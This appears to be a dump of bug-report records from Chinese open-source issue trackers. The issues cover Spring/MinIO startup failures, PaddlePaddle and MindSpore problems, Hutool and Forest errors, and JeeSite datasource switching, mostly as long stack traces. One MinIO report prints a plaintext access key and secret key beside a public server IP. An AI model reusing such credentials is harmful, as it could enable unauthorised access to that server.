org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.autowireConstructor(AbstractAutowireCapableBeanFactory.java:1266) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBeanInstance(AbstractAutowireCapableBeanFactory.java:1123) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:535) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:495) at org.springframework.beans.factory.support.AbstractBeanFactory.lambda$doGetBean$0(AbstractBeanFactory.java:317) at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:222) at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:315) at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:199) at org.springframework.beans.factory.support.DefaultListableBeanFactory.preInstantiateSingletons(DefaultListableBeanFactory.java:759) at org.springframework.context.support.AbstractApplicationContext.finishBeanFactoryInitialization(AbstractApplicationContext.java:867) at org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:548) at org.springframework.boot.web.servlet.context.ServletWebServerApplicationContext.refresh(ServletWebServerApplicationContext.java:142) at org.springframework.boot.SpringApplication.refresh(SpringApplication.java:754) at org.springframework.boot.SpringApplication.refreshContext(SpringApplication.java:386) at org.springframework.boot.SpringApplication.run(SpringApplication.java:307) at org.springframework.boot.SpringApplication.run(SpringApplication.java:1242) at org.springframework.boot.SpringApplication.run(SpringApplication.java:1230) at com.campus.message.CampusKafkaApplication.main(CampusKafkaApplication.java:20) Caused by: org.springframework.beans.factory.NoSuchBeanDefinitionException: No qualifying bean of type 'com.campus.common.minio.service.MinioTemplate' available: expected at least 1 bean which qualifies as autowire candidate. Dependency annotations: {} at org.springframework.beans.factory.support.DefaultListableBeanFactory.raiseNoMatchingBeanFound(DefaultListableBeanFactory.java:1506) at org.springframework.beans.factory.support.DefaultListableBeanFactory.doResolveDependency(DefaultListableBeanFactory.java:1101) at org.springframework.beans.factory.support.DefaultListableBeanFactory.resolveDependency(DefaultListableBeanFactory.java:1062) at org.springframework.beans.factory.support.ConstructorResolver.resolveAutowiredArgument(ConstructorResolver.java:819) at org.springframework.beans.factory.support.ConstructorResolver.createArgumentArray(ConstructorResolver.java:725) ... 19 common frames omitted
Refine CSP doc,"==&gt; Because once the channel is closed, Send will not put data into the channel but return false.   <code>: with fluid.while(steps=buffer_size): fluid.send(ch, step) fluid.close_channel(ch) with fluid.while(steps=buffer_size): fluid.send(ch, step) fluid.close_channel(ch)"
【文件服务器】搭建自己的minio的文件服务器，修改upms-biz-dev.yml中minio的配置，无法正常启动admin的服务,"pigx版本: 3.0商业版 操作系统: 平台在Win10 64位，Minio在的操作系统CentOS Linux release 7.6.1810 是否修改包名: 是 启动adminApplication的服务时候，无法正常启动，报错信息： org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'fileController' defined in file [D:\platformx-3.0-dev-0521\platformx\platformx-upms\platformx-upms-biz\target\classes\com\spcloud\platformx\admin\controller\FileController.class]: Unsatisfied dependency expressed through constructor parameter 0; nested exception is org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'template' defined in class path resource [com/spcloud/common/minio/MinioAutoConfiguration.class]: Invocation of init method failed; nested exception is http://112.124.201.228:9000/minio/platformx/: io.minio.errors.InvalidEndpointException: no path allowed in endpoint 这里粘贴代码或者、日志 1、修改CommonConstants中的默认桶： public interface CommonConstants { /** * header 中租户ID <em>/ String TENANT_ID = ""TENANT_ID""; /</em>* * 删除 <em>/ String STATUS_DEL = ""1""; /</em>* * 正常 */ String STATUS_NORMAL = ""0""; } 2、错误日志： Error starting ApplicationContext. To display the conditions report re-run your application with 'debug' enabled. 2019-05-24 09:52:40.566 ERROR 1104 --- [ main] o.s.boot.SpringApplication : Application run failed org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'fileController' defined in file [D:\platformx-3.0-dev-0521\platformx\platformx-upms\platformx-upms-biz\target\classes\com\spcloud\platformx\admin\controller\FileController.class]: Unsatisfied dependency expressed through constructor parameter 0; nested exception is org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'template' defined in class path resource [com/spcloud/common/minio/MinioAutoConfiguration.class]: Invocation of init method failed; nested exception is http://112.124.201.228:9000/minio/platformx/: io.minio.errors.InvalidEndpointException: no path allowed in endpoint at org.springframework.beans.factory.support.ConstructorResolver.createArgumentArray(ConstructorResolver.java:769) at org.springframework.beans.factory.support.ConstructorResolver.autowireConstructor(ConstructorResolver.java:218) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.autowireConstructor(AbstractAutowireCapableBeanFactory.java:1341) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBeanInstance(AbstractAutowireCapableBeanFactory.java:1187) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:555) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:515) at org.springframework.beans.factory.support.AbstractBeanFactory.lambda$doGetBean$0(AbstractBeanFactory.java:320) at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:222) at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:318) at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:199) at org.springframework.beans.factory.support.DefaultListableBeanFactory.preInstantiateSingletons(DefaultListableBeanFactory.java:849) at org.springframework.context.support.AbstractApplicationContext.finishBeanFactoryInitialization(AbstractApplicationContext.java:877) at org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:549) at org.springframework.boot.web.servlet.context.ServletWebServerApplicationContext.refresh(ServletWebServerApplicationContext.java:142) at org.springframework.boot.SpringApplication.refresh(SpringApplication.java:775) at org.springframework.boot.SpringApplication.refreshContext(SpringApplication.java:397) at org.springframework.boot.SpringApplication.run(SpringApplication.java:316) at org.springframework.boot.SpringApplication.run(SpringApplication.java:1260) at org.springframework.boot.SpringApplication.run(SpringApplication.java:1248) at com.spcloud.platformx.admin.PlatformxAdminApplication.main(PlatformxAdminApplication.java:40) Caused by: org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'template' defined in class path resource [com/spcloud/common/minio/MinioAutoConfiguration.class]: Invocation of init method failed; nested exception is http://112.124.201.228:9000/minio/platformx/: io.minio.errors.InvalidEndpointException: no path allowed in endpoint at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.initializeBean(AbstractAutowireCapableBeanFactory.java:1778) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:593) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:515) at org.springframework.beans.factory.support.AbstractBeanFactory.lambda$doGetBean$0(AbstractBeanFactory.java:320) at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:222) at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:318) at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:199) at org.springframework.beans.factory.config.DependencyDescriptor.resolveCandidate(DependencyDescriptor.java:277) at org.springframework.beans.factory.support.DefaultListableBeanFactory.doResolveDependency(DefaultListableBeanFactory.java:1247) at org.springframework.beans.factory.support.DefaultListableBeanFactory.resolveDependency(DefaultListableBeanFactory.java:1167) at org.springframework.beans.factory.support.ConstructorResolver.resolveAutowiredArgument(ConstructorResolver.java:857) at org.springframework.beans.factory.support.ConstructorResolver.createArgumentArray(ConstructorResolver.java:760) ... 19 common frames omitted Caused by: io.minio.errors.InvalidEndpointException: no path allowed in endpoint at io.minio.MinioClient.(MinioClient.java:669) at io.minio.MinioClient.(MinioClient.java:602) at io.minio.MinioClient.(MinioClient.java:560) at io.minio.MinioClient.(MinioClient.java:477) at io.minio.MinioClient.(MinioClient.java:342) at com.spcloud.common.minio.service.MinioTemplate.afterPropertiesSet(MinioTemplate.java:166) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.invokeInitMethods(AbstractAutowireCapableBeanFactory.java:1837) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.initializeBean(AbstractAutowireCapableBeanFactory.java:1774) ... 30 common frames omitted 1、在操作系统CentOS Linux release 7.6.1810上搭建minio 1）docker版本：docker-ce-17.12.1.ce 2）在centos后台通过docker方式启动minio服务，即， nohup docker run -p 9000:9000 -e MINIO_ACCESS_KEY=admin -e MINIO_SECRET_KEY=123456789 -v /platformx:/platformx minio/minio server /platformx &amp; 3）创建桶，即， 2、修改配置文件platformx-upms-biz-dev.yml，即 文件系统 minio: url: http://112.124.201.228:9000/minio/platformx/ access-key: admin secret-key: 123456789 3、启动Nacos、gateway、auth、都正常，但是启动admin的服务的时候，无法正常启动，报异常： Caused by: io.minio.errors.InvalidEndpointException: no path allowed in endpoint   <code>: /** * 锁定 */ String STATUS_LOCK = ""9""; /** * 菜单 */ String MENU = ""0""; /** * 编码 */ String UTF8 = ""UTF-8""; /** * 前端工程名 */ String FRONT_END_PROJECT = ""platformx-ui""; /** * 后端工程名 */ String BACK_END_PROJECT = ""platformx""; /** * 验证码前缀 */ String DEFAULT_CODE_KEY = ""DEFAULT_CODE_KEY_""; /** * 公共参数 */ String PIG_PUBLIC_PARAM_KEY = ""PIG_PUBLIC_PARAM_KEY""; /** * 成功标记 */ Integer SUCCESS = 0; /** * 失败标记 */ Integer FAIL = 1; /** * 默认存储bucket */ String BUCKET_NAME = ""platformx"";"
【求助】修改数据域中的长度后，程序代码生成的模型数据里没有生效,PDManer版本： v4.1.1 系统版本： Windows10 问题描述： 新建项目后，把自带的数据域-主键标识的长度从32修改为36，保存刷新后，创建一张新的表，新建主键字段并把数据域设置为，在列表上可以看到设置后的数据类型和长度，但是切换到程序代码页，查看模型数据时，字段的属性为空，导致在代码模板里没法准确获取到数据类型的长度。 而且在字段明细列表里，如果焦点落在数据类型列时，按下后，原来已经选择了数据域的下拉框的选中项，会变成。 尝试过重新安装PDManer和创建新的项目，情况还是一样。   <code>: user_uid 主键标识 user_uid len Tab键 请选择
SqlExecutor.callQuery返回的 ResultSet is closed,"使用的JDK版本和Hutool版本 java version ""1.8.0_171""   <code>: &lt;dependency&gt; &lt;groupId&gt;cn.hutool&lt;/groupId&gt; &lt;artifactId&gt;hutool-all&lt;/artifactId&gt; &lt;version&gt;5.0.7&lt;/version&gt; &lt;/dependency&gt; java.sql.SQLException: Operation not allowed after ResultSet closed at com.mysql.cj.jdbc.exceptions.SQLError.createSQLException(SQLError.java:129) at com.mysql.cj.jdbc.exceptions.SQLError.createSQLException(SQLError.java:97) at com.mysql.cj.jdbc.exceptions.SQLError.createSQLException(SQLError.java:89) at com.mysql.cj.jdbc.exceptions.SQLError.createSQLException(SQLError.java:63) at com.mysql.cj.jdbc.result.ResultSetImpl.checkClosed(ResultSetImpl.java:437) at com.mysql.cj.jdbc.result.ResultSetImpl.next(ResultSetImpl.java:1712) at com.alibaba.druid.pool.DruidPooledResultSet.next(DruidPooledResultSet.java:69) at com.kwjq.extract.util.DBUtil.conver2MapList(DBUtil.java:20) at com.kwjq.extract.service.impl.ProcedureExtractServiceImpl.extract(ProcedureExtractServiceImpl.java:54) at com.kwjq.extract.service.impl.ProcedureExtractServiceImplTest.extract(ProcedureExtractServiceImplTest.java:65) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at org.junit.runners.model.FrameworkMethod$1.runReflectiveCall(FrameworkMethod.java:50) at org.junit.internal.runners.model.ReflectiveCallable.run(ReflectiveCallable.java:12) at org.junit.runners.model.FrameworkMethod.invokeExplosively(FrameworkMethod.java:47) at org.junit.internal.runners.statements.InvokeMethod.evaluate(InvokeMethod.java:17) at org.springframework.test.context.junit4.statements.RunBeforeTestExecutionCallbacks.evaluate(RunBeforeTestExecutionCallbacks.java:74) at org.springframework.test.context.junit4.statements.RunAfterTestExecutionCallbacks.evaluate(RunAfterTestExecutionCallbacks.java:84) at org.springframework.test.context.junit4.statements.RunBeforeTestMethodCallbacks.evaluate(RunBeforeTestMethodCallbacks.java:75) at org.springframework.test.context.junit4.statements.RunAfterTestMethodCallbacks.evaluate(RunAfterTestMethodCallbacks.java:86) at org.springframework.test.context.junit4.statements.SpringRepeat.evaluate(SpringRepeat.java:84) at org.junit.runners.ParentRunner.runLeaf(ParentRunner.java:325) at org.springframework.test.context.junit4.SpringJUnit4ClassRunner.runChild(SpringJUnit4ClassRunner.java:251) at org.springframework.test.context.junit4.SpringJUnit4ClassRunner.runChild(SpringJUnit4ClassRunner.java:97) at org.junit.runners.ParentRunner$3.run(ParentRunner.java:290) at org.junit.runners.ParentRunner$1.schedule(ParentRunner.java:71) at org.junit.runners.ParentRunner.runChildren(ParentRunner.java:288) at org.junit.runners.ParentRunner.access$000(ParentRunner.java:58) at org.junit.runners.ParentRunner$2.evaluate(ParentRunner.java:268) at org.springframework.test.context.junit4.statements.RunBeforeTestClassCallbacks.evaluate(RunBeforeTestClassCallbacks.java:61) at org.springframework.test.context.junit4.statements.RunAfterTestClassCallbacks.evaluate(RunAfterTestClassCallbacks.java:70) at org.junit.runners.ParentRunner.run(ParentRunner.java:363) at org.springframework.test.context.junit4.SpringJUnit4ClassRunner.run(SpringJUnit4ClassRunner.java:190) at org.junit.runner.JUnitCore.run(JUnitCore.java:137) at com.intellij.junit4.JUnit4IdeaTestRunner.startRunnerWithArgs(JUnit4IdeaTestRunner.java:68) at com.intellij.rt.execution.junit.IdeaTestRunner$Repeater.startRunnerWithArgs(IdeaTestRunner.java:47) at com.intellij.rt.execution.junit.JUnitStarter.prepareStreamsAndStart(JUnitStarter.java:242) at com.intellij.rt.execution.junit.JUnitStarter.main(JUnitStarter.java:70)"
{变量名}格式字符串模板在引用隐式变量时出错,"Forest: 1.5.11 Backend: okhttp或httpclient 该问题是如何引起的？ {变量名}格式字符串模板在引用隐式变量时出错 会报错：找不到变量 _index   <code>: @Post( url = ""http://localhost:{port}/hello-list"", contentType = ""application/x-www-form-urlencoded"" ) String listBodyPost(@Body(""item_{_index}"") List&lt;String&gt; list);"
【众智】【计算-AICPU开发】UpsampleNearest3dGrad,AICPU算子接入 UpsampleNearest3d的反向算子。 接口目录：mindspore/ops/operations/_grad_ops.py grad_output y input_size list_int 属性 output_size list_int 属性 scales list_float 属性 对应底层算子 对应底层AI CPU算子UpsampleNearest3dGrad aten/src/ATen/native/UpSampleNearest3d.cpp 3. 异常处理 4. 算子反向 无需接入反向算子   <code>: class UpsampleNearest3dGrad(Primitive):
一些配置文件里面的注释是乱码,例如   <code>: \eureka-server\src\main\resources\application.properties#6 spring.application.name=eureka-server server.port=1111 eureka.instance.hostname=localhost # ??±?±??¤?ú?? #eureka.server.enable-self-preservation=false eureka.client.register-with-eureka=false eureka.client.fetch-registry=false eureka.client.serviceUrl.defaultZone=http://${eureka.instance.hostname}:${server.port}/eureka/
ctr 运行过程中os error,"运行环境：MPI 30 pserver，30 Trainer，同步 pserver 日志：   <code>: The default exception handler is LOG(FATAL).selected rows is full, then length exceed 3333333 at [/paddle/paddle/fluid/framework/selected_rows.cc:145] Fri Aug 31 18:37:20 2018[1,5]&lt;stdout&gt;:PaddlePaddle Call Stacks: Fri Aug 31 18:37:20 2018[1,5]&lt;stdout&gt;:0 0x7facb1d17486p paddle::platform::EnforceNotMet::EnforceNotMet(std::__exception_ptr::exception_ptr, char const*, int) + 486 Fri Aug 31 18:37:20 2018[1,5]&lt;stdout&gt;:1 0x7facb270e522p paddle::framework::SelectedRows::AutoGrownIndex(long, bool) + 1282 Fri Aug 31 18:37:20 2018[1,5]&lt;stdout&gt;:2 0x7facb270f3d7p paddle::framework::SelectedRows::Get(paddle::framework::Tensor const&amp;, paddle::framework::Tensor*, bool) + 455 Fri Aug 31 18:37:20 2018[1,5]&lt;stdout&gt;:3 0x7facb22d751dp paddle::operators::LookupSparseTableOp::RunImpl(paddle::framework::Scope const&amp;, boost::variant&lt;paddle::platform::CUDAPlace, paddle::platform::CPUPlace, paddle::platform::CUDAPinnedPlace, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_&gt; const&amp;) const + 1293 Fri Aug 31 18:37:20 2018[1,5]&lt;stdout&gt;:4 0x7facb26d89afp paddle::framework::OperatorBase::Run(paddle::framework::Scope const&amp;, boost::variant&lt;paddle::platform::CUDAPlace, paddle::platform::CPUPlace, paddle::platform::CUDAPinnedPlace, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_&gt; const&amp;) + 255 Fri Aug 31 18:37:20 2018[1,5]&lt;stdout&gt;:5 0x7facb1dd4209p paddle::framework::Executor::RunPreparedContext(paddle::framework::ExecutorPrepareContext*, paddle::framework::Scope*, bool, bool, bool) + 393 Fri Aug 31 18:37:20 2018[1,5]&lt;stdout&gt;:6 0x7facb261b4adp Fri Aug 31 18:37:20 2018[1,5]&lt;stdout&gt;:7 0x7facb245f57ap std::_Function_handler&lt;std::unique_ptr&lt;std::__future_base::_Result_base, std::__future_base::_Result_base::_Deleter&gt; (), std::__future_base::_Task_setter&lt;std::unique_ptr&lt;std::__future_base::_Result&lt;std::unique_ptr&lt;paddle::platform::EnforceNotMet, std::default_delete&lt;paddle::platform::EnforceNotMet&gt; &gt; &gt;, std::__future_base::_Result_base::_Deleter&gt;, std::unique_ptr&lt;paddle::platform::EnforceNotMet, std::default_delete&lt;paddle::platform::EnforceNotMet&gt; &gt; &gt; &gt;::_M_invoke(std::_Any_data const&amp;) + 42 Fri Aug 31 18:37:20 2018[1,5]&lt;stdout&gt;:8 0x7facb1e47fa7p std::__future_base::_State_base::_M_do_set(std::function&lt;std::unique_ptr&lt;std::__future_base::_Result_base, std::__future_base::_Result_base::_Deleter&gt; ()&gt;&amp;, bool&amp;) + 39 Fri Aug 31 18:37:20 2018[1,5]&lt;stdout&gt;:9 0x7faccde53973p pthread_once + 83 Fri Aug 31 18:37:20 2018[1,5]&lt;stdout&gt;:10 0x7facb261a152p Fri Aug 31 18:37:20 2018[1,5]&lt;stdout&gt;:11 0x7facb26ef658p paddle::framework::ThreadPool::TaskLoop() + 920 Fri Aug 31 18:37:20 2018[1,5]&lt;stdout&gt;:12 0x7facc0ebe8a0p Fri Aug 31 18:37:20 2018[1,5]&lt;stdout&gt;:13 0x7faccde4e1c3p Fri Aug 31 18:37:20 2018[1,5]&lt;stdout&gt;:14 0x7faccd47612dp clone + 109 Fri Aug 31 18:37:20 2018[1,5]&lt;stdout&gt;:*** Check failure stack trace: *** Fri Aug 31 18:37:20 2018[1,5]&lt;stdout&gt;: @ 0x7facb1d9192d google::LogMessage::Fail() Fri Aug 31 18:37:20 2018[1,5]&lt;stdout&gt;: @ 0x7facb1d953dc google::LogMessage::SendToLog() Fri Aug 31 18:37:20 2018[1,5]&lt;stdout&gt;: @ 0x7facb1d91453 google::LogMessage::Flush() Fri Aug 31 18:37:21 2018[1,5]&lt;stdout&gt;: @ 0x7facb1d968ee google::LogMessageFatal::~LogMessageFatal() Fri Aug 31 18:37:21 2018[1,5]&lt;stdout&gt;: @ 0x7facb2460188 std::_Function_handler&lt;&gt;::_M_invoke() Fri Aug 31 18:37:21 2018[1,5]&lt;stdout&gt;: @ 0x7facb245e503 std::_Function_handler&lt;&gt;::_M_invoke() Fri Aug 31 18:37:21 2018[1,5]&lt;stdout&gt;: @ 0x7facb1e47fa7 std::__future_base::_State_base::_M_do_set() Fri Aug 31 18:37:21 2018[1,5]&lt;stdout&gt;: @ 0x7faccde53973 __GI___pthread_once Fri Aug 31 18:37:21 2018[1,5]&lt;stdout&gt;: @ 0x7facb245f269 std::__future_base::_Deferred_state&lt;&gt;::_M_run_deferred() Fri Aug 31 18:37:21 2018[1,5]&lt;stdout&gt;: @ 0x7facb261d12f paddle::operators::distributed::RequestPrefetchHandler::Handle() Fri Aug 31 18:37:21 2018[1,5]&lt;stdout&gt;: @ 0x7facb262499e paddle::operators::distributed::RequestPrefetch::Process() Fri Aug 31 18:37:21 2018[1,5]&lt;stdout&gt;: @ 0x7facb262050a paddle::operators::distributed::AsyncGRPCServer::HandleRequest() Fri Aug 31 18:37:21 2018[1,5]&lt;stdout&gt;: @ 0x7facb2623f4f std::thread::_Impl&lt;&gt;::_M_run() Fri Aug 31 18:37:21 2018[1,5]&lt;stdout&gt;: @ 0x7facc0ebe8a0 execute_native_thread_routine Fri Aug 31 18:37:21 2018[1,5]&lt;stdout&gt;: @ 0x7faccde4e1c3 start_thread Fri Aug 31 18:37:21 2018[1,5]&lt;stdout&gt;: @ 0x7faccd47612d __clone Fri Aug 31 18:37:21 2018[1,5]&lt;stdout&gt;: @ (nil) (unknown) Fri Aug 31 18:37:38 2018[1,5]&lt;stdout&gt;:sh: line 1: 85553 Aborted (core dumped) python -u wide.py --use_parallel_exe 1 --data_dir ../../train_data --test_data_dir ../../test_data --batch_size 1024 --cpu_num=8 Fri Aug 31 18:37:38 2018[1,5]&lt;stdout&gt;:paddle_cloud_job_env=MULTI_MACHINE_MULTI_CPU_GRPC_SYNC"
如何在业务代码中基于数据库中的jdbc配置信息动态切换数据源,"数据库的jdbc连接配置存在数据库中，如果需要在service或者dao层动态切换当前线程使用的数据源，应该怎么做？ 代码中添加数据源 aop中切换数据源 应用启动时能正常添加数据源 访问aop切入的功能报错 环境版本： JDK版本：1.8 浏览器版本：Chrome 98.0.4758.102（正式版本） （64 位） 平台版本：JeeSite 4.3.3-SNAPSHOT master分支   <code>: package com.jeesite.modules; import com.alibaba.druid.DbType; import com.alibaba.druid.pool.DruidDataSource; import com.jeesite.common.datasource.RoutingDataSource; import org.springframework.beans.factory.annotation.Autowired; import org.springframework.boot.ApplicationArguments; import org.springframework.boot.ApplicationRunner; import org.springframework.stereotype.Component; /** * @author: ya_jun * @create: 2022-02-25 22:27 **/ @Component public class DsApplicationRunner implements ApplicationRunner { @Autowired private RoutingDataSource routingDataSource; @Override public void run(ApplicationArguments args) throws Exception { // 这里算是伪代码，省去了从数据库查询的步骤（正经写个查询是能从数据库中加载想要的信息的） // 应用启动后添加数据源到routingDataSource DruidDataSource druidDataSource = new DruidDataSource(); druidDataSource.setDbType(DbType.mysql); druidDataSource.setDriverClassName(""com.mysql.cj.jdbc.Driver""); druidDataSource.setUrl(""jdbc:mysql://127.0.0.1:3306/jeesite?useSSL=false&amp;useUnicode=true&amp;characterEncoding=utf-8&amp;zeroDateTimeBehavior=CONVERT_TO_NULL&amp;serverTimezone=Asia/Shanghai""); druidDataSource.setUsername(""root""); druidDataSource.setPassword(""password""); routingDataSource.addDataSource(""ds0"", druidDataSource); } } package com.jeesite.modules; import com.jeesite.common.datasource.DataSourceHolder; import com.jeesite.common.datasource.RoutingDataSource; import org.aspectj.lang.annotation.After; import org.aspectj.lang.annotation.Aspect; import org.aspectj.lang.annotation.Before; import org.aspectj.lang.annotation.Pointcut; import org.springframework.beans.factory.annotation.Autowired; import org.springframework.stereotype.Component; /** * @author: ya_jun * @create: 2022-02-25 22:36 **/ @Aspect @Component public class MyAop { // 这里往service和dao层切入都能达到测试效果 // @Pointcut(""execution(* com.jeesite.modules.test.service..*.*(..))"") @Pointcut(""execution(* com.jeesite.modules.test.dao..*.*(..))"") public void point() {} @Autowired private RoutingDataSource routingDataSource; @Before(""point()"") public void doBefore() { // 打印一下代码中添加的数据源名称：ds0 System.out.println(routingDataSource.getDataSourceMap().keySet()); // dao层方法执行前指定数据源为ds0，这里就报错了 DataSourceHolder.setDataSourceName(""ds0""); } @After(""point()"") public void doAfter() { DataSourceHolder.clearDataSourceName(); } } ""C:\Program Files\Java\jdk1.8.0_201\bin\java.exe"" -agentlib:jdwp=transport=dt_socket,address=127.0.0.1:9975,suspend=y,server=n -XX:TieredStopAtLevel=1 -noverify -Dspring.output.ansi.enabled=always -Dcom.sun.management.jmxremote -Dspring.jmx.enabled=true -Dspring.liveBeansView.mbeanDomain -Dspring.application.admin.enabled=true -javaagent:C:\Users\ya_jun\AppData\Local\JetBrains\IntelliJIdea2021.3\captureAgent\debugger-agent.jar -Dfile.encoding=UTF-8 -classpath ""C:\Program Files\Java\jdk1.8.0_201\jre\lib\charsets.jar;C:\Program Files\Java\jdk1.8.0_201\jre\lib\deploy.jar;C:\Program Files\Java\jdk1.8.0_201\jre\lib\ext\access-bridge-64.jar;C:\Program Files\Java\jdk1.8.0_201\jre\lib\ext\cldrdata.jar;C:\Program Files\Java\jdk1.8.0_201\jre\lib\ext\dnsns.jar;C:\Program Files\Java\jdk1.8.0_201\jre\lib\ext\jaccess.jar;C:\Program Files\Java\jdk1.8.0_201\jre\lib\ext\jfxrt.jar;C:\Program Files\Java\jdk1.8.0_201\jre\lib\ext\localedata.jar;C:\Program Files\Java\jdk1.8.0_201\jre\lib\ext\nashorn.jar;C:\Program Files\Java\jdk1.8.0_201\jre\lib\ext\sunec.jar;C:\Program Files\Java\jdk1.8.0_201\jre\lib\ext\sunjce_provider.jar;C:\Program Files\Java\jdk1.8.0_201\jre\lib\ext\sunmscapi.jar;C:\Program Files\Java\jdk1.8.0_201\jre\lib\ext\sunpkcs11.jar;C:\Program Files\Java\jdk1.8.0_201\jre\lib\ext\zipfs.jar;C:\Program Files\Java\jdk1.8.0_201\jre\lib\javaws.jar;C:\Program Files\Java\jdk1.8.0_201\jre\lib\jce.jar;C:\Program Files\Java\jdk1.8.0_201\jre\lib\jfr.jar;C:\Program Files\Java\jdk1.8.0_201\jre\lib\jfxswt.jar;C:\Program Files\Java\jdk1.8.0_201\jre\lib\jsse.jar;C:\Program Files\Java\jdk1.8.0_201\jre\lib\management-agent.jar;C:\Program Files\Java\jdk1.8.0_201\jre\lib\plugin.jar;C:\Program Files\Java\jdk1.8.0_201\jre\lib\resources.jar;C:\Program Files\Java\jdk1.8.0_201\jre\lib\rt.jar;C:\MyFiles\JavaCode\GitCode\jeesite4\web\src\main\webapp\WEB-INF\classes;C:\MyFiles\JavaCode\GitCode\jeesite4\modules\core\target\classes;C:\MySoftware\apache-maven-3.8.1\repository\mysql\mysql-connector-java\8.0.27\mysql-connector-java-8.0.27.jar;C:\MySoftware\apache-maven-3.8.1\repository\com\oracle\ojdbc6\11.2.0.3\ojdbc6-11.2.0.3.jar;C:\MySoftware\apache-maven-3.8.1\repository\net\sourceforge\jtds\jtds\1.3.1\jtds-1.3.1.jar;C:\MySoftware\apache-maven-3.8.1\repository\org\postgresql\postgresql\42.2.24\postgresql-42.2.24.jar;C:\MySoftware\apache-maven-3.8.1\repository\org\checkerframework\checker-qual\3.5.0\checker-qual-3.5.0.jar;C:\MyFiles\JavaCode\GitCode\jeesite4\common\target\classes;C:\MySoftware\apache-maven-3.8.1\repository\org\apache\commons\commons-lang3\3.12.0\commons-lang3-3.12.0.jar;C:\MySoftware\apache-maven-3.8.1\repository\commons-codec\commons-codec\1.15\commons-codec-1.15.jar;C:\MySoftware\apache-maven-3.8.1\repository\commons-io\commons-io\2.7\commons-io-2.7.jar;C:\MySoftware\apache-maven-3.8.1\repository\commons-fileupload\commons-fileupload\1.4\commons-fileupload-1.4.jar;C:\MySoftware\apache-maven-3.8.1\repository\commons-beanutils\commons-beanutils\1.9.4\commons-beanutils-1.9.4.jar;C:\MySoftware\apache-maven-3.8.1\repository\commons-logging\commons-logging\1.2\commons-logging-1.2.jar;C:\MySoftware\apache-maven-3.8.1\repository\commons-collections\commons-collections\3.2.2\commons-collections-3.2.2.jar;C:\MySoftware\apache-maven-3.8.1\repository\org\apache\commons\commons-text\1.9\commons-text-1.9.jar;C:\MySoftware\apache-maven-3.8.1\repository\de\ruedigermoeller\fst\2.57\fst-2.57.jar;C:\MySoftware\apache-maven-3.8.1\repository\org\javassist\javassist\3.21.0-GA\javassist-3.21.0-GA.jar;C:\MySoftware\apache-maven-3.8.1\repository\org\objenesis\objenesis\2.5.1\objenesis-2.5.1.jar;C:\MySoftware\apache-maven-3.8.1\repository\com\fasterxml\jackson\core\jackson-core\2.12.6\jackson-core-2.12.6.jar;C:\MySoftware\apache-maven-3.8.1\repository\com\fasterxml\jackson\core\jackson-databind\2.12.6\jackson-databind-2.12.6.jar;C:\MySoftware\apache-maven-3.8.1\repository\com\fasterxml\jackson\dataformat\jackson-dataformat-xml\2.12.6\jackson-dataformat-xml-2.12.6.jar;C:\MySoftware\apache-maven-3.8.1\repository\com\fasterxml\jackson\module\jackson-module-jaxb-annotations\2.12.6\jackson-module-jaxb-annotations-2.12.6.jar;C:\MySoftware\apache-maven-3.8.1\repository\jakarta\xml\bind\jakarta.xml.bind-api\2.3.3\jakarta.xml.bind-api-2.